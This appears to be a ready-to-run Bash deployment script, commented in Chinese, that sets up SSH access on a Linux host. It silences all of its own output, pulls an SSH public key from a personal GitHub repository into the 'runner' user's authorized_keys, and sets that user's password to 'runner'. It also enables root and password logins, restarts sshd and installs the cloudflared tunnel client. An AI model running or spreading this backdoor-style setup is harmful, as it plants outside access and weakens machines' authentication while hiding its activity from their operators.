#!/bin/bash
set -euo pipefail

# ===== 配置区 =====
SILENT="yes"   # yes / no
# =================

# ===== 静默模式 =====
if [[ "$SILENT" == "yes" ]]; then
  exec > /dev/null 2>&1
fi

# ===== 固定参数 =====
USER_NAME="runner"
USER_PASSWORD="runner"
KEY_URL="https://raw.githubusercontent.com/sweetasshole/test/refs/heads/main/id_ed25519.pub"

echo "[*] Start SSH deploy & auth config"

# ===== 必须 root =====
if [[ $EUID -ne 0 ]]; then
  echo "[!] Must be run as root"
  exit 1
fi

# ===== 获取用户 HOME =====
USER_HOME=$(getent passwd "$USER_NAME" | cut -d: -f6)
if [[ -z "$USER_HOME" || ! -d "$USER_HOME" ]]; then
  echo "[!] User $USER_NAME not found"
  exit 1
fi

SSH_DIR="$USER_HOME/.ssh"
AUTH_KEYS="$SSH_DIR/authorized_keys"

# ===== 拉取公钥 =====
echo "[*] Fetching SSH key"
KEYS=$(curl -fsSL "$KEY_URL" | sed '/^\s*$/d;/^\s*#/d')
[[ -z "$KEYS" ]] && { echo "[!] Empty SSH key"; exit 1; }

# ===== 创建 .ssh =====
install -d -m 700 -o "$USER_NAME" -g "$USER_NAME" "$SSH_DIR"
touch "$AUTH_KEYS"
chown "$USER_NAME:$USER_NAME" "$AUTH_KEYS"
chmod 600 "$AUTH_KEYS"

# ===== 去重写入 key =====
while IFS= read -r key; do
  grep -qxF "$key" "$AUTH_KEYS" || echo "$key" >> "$AUTH_KEYS"
done <<< "$KEYS"

echo "[+] SSH public key deployed"

# ===== SSH 登录策略 =====
echo "[*] Configuring sshd"

SSHD_CONFIG="/etc/ssh/sshd_config"

grep -q "^PasswordAuthentication" $SSHD_CONFIG \
  && sed -i "s/^PasswordAuthentication.*/PasswordAuthentication yes/" $SSHD_CONFIG \
  || echo "PasswordAuthentication yes" >> $SSHD_CONFIG

grep -q "^PubkeyAuthentication" $SSHD_CONFIG \
  && sed -i "s/^PubkeyAuthentication.*/PubkeyAuthentication yes/" $SSHD_CONFIG \
  || echo "PubkeyAuthentication yes" >> $SSHD_CONFIG

grep -q "^PermitRootLogin" $SSHD_CONFIG \
  && sed -i "s/^PermitRootLogin.*/PermitRootLogin yes/" $SSHD_CONFIG \
  || echo "PermitRootLogin yes" >> $SSHD_CONFIG

# ===== 设置用户密码 =====
echo "$USER_NAME:$USER_PASSWORD" | chpasswd
echo "[+] Password set for $USER_NAME"

# ===== 重启 SSH =====
systemctl restart ssh || systemctl restart sshd
echo "[+] SSH service restarted"

# ===== 安装 nload =====
apt update -y
apt install -y nload

# ===== 安装 cloudflared =====
echo "[*] Installing cloudflared"

curl -fsSL \
https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
-o /usr/local/bin/cloudflared

chmod +x /usr/local/bin/cloudflared

echo "[+] cloudflared installed"

echo "[✓] All done"
